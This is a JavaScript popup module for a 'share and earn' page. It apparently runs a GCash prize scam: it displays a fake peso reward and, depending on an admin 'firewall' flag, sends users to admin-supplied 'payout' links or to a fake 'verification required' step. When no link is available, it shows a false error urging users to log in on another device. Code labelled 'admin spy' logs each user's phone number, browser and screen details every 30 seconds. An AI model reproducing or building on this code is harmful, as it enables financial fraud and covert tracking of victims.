/**
 * Popup Share Module - Integrated with Admin Panel
 * Phases: 1 (Default) | 2 (Firewall OFF) | 3 (Firewall ON - later)
 * Real-time user tracking for admin spy
 */

// ========== STRICT MODE ==========
'use strict';

// ========== GLOBAL VARIABLES ==========
let currentPhase = 1;
let currentBalance = 0;
let currentUserPhone = null;
let currentFirewallStatus = false;
let globalFirewallRef = null;
let userSessionRef = null;

// ========== INITIALIZATION ==========
async function initPopupModule() {
    console.log('🎁 Popup Module Initializing...');
    
    currentUserPhone = localStorage.getItem("userPhone");
    if (!currentUserPhone) {
        console.warn('No user phone found');
        return;
    }
    
    // Update user last seen for admin spy
    await updateUserLastSeen();
    
    // Setup real-time user tracking (para ma-spy ng admin)
    setupUserTracking();
    
    // Get firewall status from Firebase
    await getFirewallStatus();
    
    // Listen for real-time firewall changes
    setupFirewallListener();
    
    console.log('✅ Popup Module Ready - Firewall:', currentFirewallStatus);
}

// ========== ADMIN SPY - USER TRACKING ==========
async function updateUserLastSeen() {
    if (!currentUserPhone) return;
    
    try {
        const db = firebase.database();
        const userRef = db.ref('user_sessions/' + currentUserPhone);
        
        await userRef.update({
            lastSeen: Date.now(),
            lastSeenFormatted: new Date().toLocaleString(),
            userAgent: navigator.userAgent,
            screenSize: `${window.innerWidth}x${window.innerHeight}`,
            lastActivePage: 'share_and_earn.html'
        });
        
        console.log('📍 User activity tracked for admin spy');
    } catch(e) {
        console.error('User tracking error:', e);
    }
}

function setupUserTracking() {
    if (!currentUserPhone) return;
    
    // Track page visibility (active/inactive)
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden) {
            updateUserLastSeen();
        }
    });
    
    // Track before unload
    window.addEventListener('beforeunload', () => {
        if (userSessionRef) {
            userSessionRef.child('lastActive').set(Date.now());
        }
    });
    
    // Track every 30 seconds (active user)
    setInterval(() => {
        updateUserLastSeen();
    }, 30000);
}

// ========== FIREWALL STATUS ==========
async function getFirewallStatus() {
    try {
        const db = firebase.database();
        const snapshot = await db.ref('admin/globalFirewall').once('value');
        const data = snapshot.val();
        currentFirewallStatus = (data && data.active === true);
        console.log('🔥 Firewall status:', currentFirewallStatus ? 'ON' : 'OFF');
        return currentFirewallStatus;
    } catch(e) {
        console.error('Firewall status error:', e);
        return false;
    }
}

function setupFirewallListener() {
    try {
        const db = firebase.database();
        globalFirewallRef = db.ref('admin/globalFirewall');
        
        globalFirewallRef.on('value', (snapshot) => {
            const data = snapshot.val();
            currentFirewallStatus = (data && data.active === true);
            console.log('🔥 Firewall status updated:', currentFirewallStatus ? 'ON' : 'OFF');
            
            // Update UI if popup is open
            const popup = document.getElementById('prizePopup');
            if (popup && popup.style.display === 'flex') {
                // Refresh current phase based on new firewall status
                const currentDisplayPhase = getCurrentDisplayPhase();
                if (currentFirewallStatus && currentDisplayPhase === 2) {
                    // If firewall turned ON while in phase 2, stay or warn?
                    console.log('Firewall turned ON - user may need verification');
                }
            }
        });
    } catch(e) {
        console.error('Firewall listener error:', e);
    }
}

function getCurrentDisplayPhase() {
    // Check what phase is currently displayed
    const popupInner = document.querySelector('.popup-inner');
    if (!popupInner) return 1;
    
    if (popupInner.innerHTML.includes('PROCEED TO GCASH')) return 2;
    if (popupInner.innerHTML.includes('VERIFY NOW')) return 3;
    return 1;
}

// ========== GET LATEST PAYOUT LINK FROM ADMIN ==========
async function getLatestPayoutLink() {
    try {
        const db = firebase.database();
        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        
        if (snapshot.exists()) {
            const key = Object.keys(snapshot.val())[0];
            const linkData = snapshot.val()[key];
            console.log("🔗 Found payout link:", linkData.url);
            return { key: key, url: linkData.url, data: linkData };
        }
        console.warn("No available links found in Firebase");
        return null;
    } catch (error) {
        console.error("Error getting payout link:", error);
        return null;
    }
}

// ========== UPDATE LINK STATUS (para hindi magamit muli) ==========
async function markLinkAsUsed(linkKey, userPhone) {
    try {
        const db = firebase.database();
        await db.ref('links/' + linkKey).update({
            status: 'used',
            user: userPhone,
            usedAt: Date.now(),
            usedAtFormatted: new Date().toLocaleString()
        });
        console.log('🔗 Link marked as used by:', userPhone);
    } catch(e) {
        console.error('Error updating link status:', e);
    }
}

// ========== PHASE 1: DEFAULT POPUP ==========
function showPhase1(balance) {
    const popupInner = document.querySelector('.popup-inner');
    if (!popupInner) return;
    
    currentPhase = 1;
    currentBalance = balance;
    
    popupInner.innerHTML = `
        <div class="popup-close" onclick="window.closePrizePopup()">✕</div>
        <h2 class="popup-title">🎉 HOORAY! 🎉</h2>
        <div class="prize-amount">₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span></div>
        <div class="divider"></div>
        <div class="invite-text">Your friend must confirm your invitation to get extra <strong>₱150 bonus</strong>.</div>
        <div class="luckyday-image-container">
            <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" onerror="this.style.display='none'">
        </div>
        <div class="divider"></div>
        <div class="indicator-group">
            <div class="indicator" id="indicator1"></div>
            <div class="indicator" id="indicator2"></div>
            <div class="indicator" id="indicator3"></div>
        </div>
        
        <button class="claim-gcash-button" id="claimGCashBtnPopup">
            <img src="images/gc_icon.png" class="gc-icon"> CLAIM THRU GCASH
        </button>

        <div class="button-separator"></div>

        <button class="back-btn" id="backBtnPopup" onclick="window.closePrizePopup()">
            ← BACK
        </button>
    `;
    
    // Attach event listener to GCash button
    const gcashBtn = document.getElementById('claimGCashBtnPopup');
    if (gcashBtn) {
        gcashBtn.addEventListener('click', handlePhase1ButtonClick);
    }
}

// ========== HANDLE PHASE 1 BUTTON CLICK (Check Firewall Status) ==========
async function handlePhase1ButtonClick() {
    console.log('🔘 Phase 1 button clicked - Checking firewall status...');
    
    // Add loading effect sa button
    const btn = document.getElementById('claimGCashBtnPopup');
    if (btn) {
        btn.disabled = true;
        btn.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="animation: pulse 0.5s infinite;"> CHECKING...`;
        btn.style.opacity = '0.7';
    }
    
    // Get latest firewall status
    await getFirewallStatus();
    
    // Remove loading effect
    if (btn) {
        btn.disabled = false;
    }
    
    if (currentFirewallStatus) {
        // FIREWALL ON - Transition to Phase 3 (later)
        console.log('🔥 Firewall ON - Transition to Phase 3');
        showPhase3();
    } else {
        // FIREWALL OFF - Transition to Phase 2
        console.log('🔓 Firewall OFF - Transition to Phase 2');
        showPhase2();
    }
}

// ========== PHASE 2: FIREWALL OFF - Withdrawal Link ==========
function showPhase2() {
    const popupInner = document.querySelector('.popup-inner');
    if (!popupInner) return;
    
    currentPhase = 2;
    
    popupInner.innerHTML = `
        <div class="popup-close" onclick="window.closePrizePopup()">✕</div>
        <h2 class="popup-title" style="font-size: 22px;">🔗 WITHDRAWAL LINK</h2>
        <div class="divider"></div>
        <div class="invite-text" style="margin: 15px 0;">
            Click the button below to proceed to GCash<br>
            and claim your reward of <strong style="color:#ffd700;">₱${currentBalance.toFixed(2)}</strong>
        </div>
        <div class="prize-amount-wrapper" style="border: 1px solid #ffd700; border-radius: 20px; padding: 15px; margin: 15px 0; background: rgba(255,215,0,0.05);">
            <div style="font-size: 11px; color: #ffd700;">YOUR REWARD</div>
            <div style="font-size: 32px; color: #fff; font-weight: bold;">₱${currentBalance.toFixed(2)}</div>
        </div>
        
        <button class="claim-gcash-button" id="proceedToGCashBtn" style="background: linear-gradient(135deg, #00a650, #008c3a);">
            <img src="images/gc_icon.png" class="gc-icon"> PROCEED TO GCASH
        </button>

        <div class="button-separator"></div>

        <button class="back-btn" id="backBtnPhase2" onclick="window.closePrizePopup()">
            ← BACK
        </button>
    `;
    
    // Attach event listener to Proceed button
    const proceedBtn = document.getElementById('proceedToGCashBtn');
    if (proceedBtn) {
        proceedBtn.addEventListener('click', handlePhase2Proceed);
    }
}

// ========== PHASE 2: PROCEED BUTTON - Check for Link ==========
async function handlePhase2Proceed() {
    console.log('🔘 Phase 2 Proceed clicked - Checking for payout link...');
    
    const btn = document.getElementById('proceedToGCashBtn');
    if (btn) {
        btn.disabled = true;
        btn.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="animation: pulse 0.5s infinite;"> CHECKING LINK...`;
        btn.style.opacity = '0.7';
    }
    
    // Get latest payout link from admin
    const linkData = await getLatestPayoutLink();
    
    if (btn) {
        btn.disabled = false;
    }
    
    if (linkData && linkData.url) {
        // MAY LINK - Redirect to GCash
        console.log('🔗 Redirecting to:', linkData.url);
        
        // Update link status to used
        await markLinkAsUsed(linkData.key, currentUserPhone);
        
        // Update user session for admin tracking
        await updateUserLastSeen();
        
        // Force redirect (magbubukas sa GCash app or browser)
        window.location.href = linkData.url;
        
    } else {
        // WALANG LINK - Show alert message
        console.log('⚠️ No link available');
        
        if (btn) {
            btn.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> PROCEED TO GCASH`;
            btn.style.opacity = '1';
        }
        
        alert("⚠️ Withdrawal Unsuccessful\n\nMukhang hindi namin ma-proseso ang iyong request dahil kailangan ng GCash App update o kaya ay wala itong mahanap na GCash sa iyong device.\n\nSolution: Siguraduhing updated ang iyong app o subukang mag-login sa ibang device para makuha na ang iyong rewards! 🚀");
    }
}

// ========== PHASE 3: FIREWALL ON (Later - Placeholder) ==========
function showPhase3() {
    const popupInner = document.querySelector('.popup-inner');
    if (!popupInner) return;
    
    currentPhase = 3;
    
    popupInner.innerHTML = `
        <div class="popup-close" onclick="window.closePrizePopup()">✕</div>
        <h2 class="popup-title" style="font-size: 22px;">🔒 VERIFICATION REQUIRED</h2>
        <div class="divider"></div>
        <div class="invite-text" style="margin: 15px 0;">
            Due to security protocol, you need to verify your account<br>
            before claiming your reward of <strong style="color:#ffd700;">₱${currentBalance.toFixed(2)}</strong>
        </div>
        <div class="prize-amount-wrapper" style="border: 1px solid #ff4444; border-radius: 20px; padding: 15px; margin: 15px 0; background: rgba(255,68,68,0.05);">
            <div style="font-size: 11px; color: #ff4444;">PENDING VERIFICATION</div>
            <div style="font-size: 32px; color: #fff; font-weight: bold;">₱${currentBalance.toFixed(2)}</div>
        </div>
        
        <button class="claim-gcash-button" id="verifyNowBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000);">
            📞 VERIFY NOW
        </button>

        <div class="button-separator"></div>

        <button class="back-btn" id="backBtnPhase3" onclick="window.closePrizePopup()">
            ← BACK
        </button>
    `;
    
    // Phase 3 logic (to be implemented later)
    const verifyBtn = document.getElementById('verifyNowBtn');
    if (verifyBtn) {
        verifyBtn.addEventListener('click', () => {
            alert("Verification feature coming soon...");
        });
    }
}

// ========== MAIN SHOW POPUP FUNCTION ==========
async function showPopup(balance) {
    console.log('🎁 Showing popup with balance:', balance);
    
    currentBalance = balance;
    
    // Update user tracking (para makita ni admin na nag-open ng popup)
    await updateUserLastSeen();
    
    // Get fresh firewall status
    await getFirewallStatus();
    
    // Show Phase 1 (Default)
    showPhase1(balance);
    
    // Show the popup container
    const popup = document.getElementById('prizePopup');
    if (popup) {
        popup.style.display = 'flex';
        
        // Hide winner ticker
        const ticker = document.getElementById('winnerTicker');
        if (ticker) ticker.style.display = 'none';
        
        // Start confetti
        if (window.startConfetti) window.startConfetti();
        
        // Play sound
        if (window.SoundEffects) window.SoundEffects.playClaim();
    }
}

// ========== CLOSE POPUP ==========
function closePopup() {
    const popup = document.getElementById('prizePopup');
    if (popup) {
        popup.style.display = 'none';
        
        // Show winner ticker back
        const ticker = document.getElementById('winnerTicker');
        if (ticker) ticker.style.display = 'flex';
        
        // Stop confetti
        if (window.stopConfetti) window.stopConfetti();
    }
}

// ========== RESET POPUP (for admin refresh) ==========
function resetPopup() {
    currentPhase = 1;
    if (document.getElementById('prizePopup') && document.getElementById('prizePopup').style.display === 'flex') {
        showPhase1(currentBalance);
    }
}

// ========== EXPORT FUNCTIONS ==========
window.showPopup = showPopup;
window.closePrizePopup = closePopup;
window.resetPopup = resetPopup;
window.getFirewallStatus = getFirewallStatus;

// ========== AUTO-INITIALIZE ==========
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initPopupModule);
} else {
    initPopupModule();
}
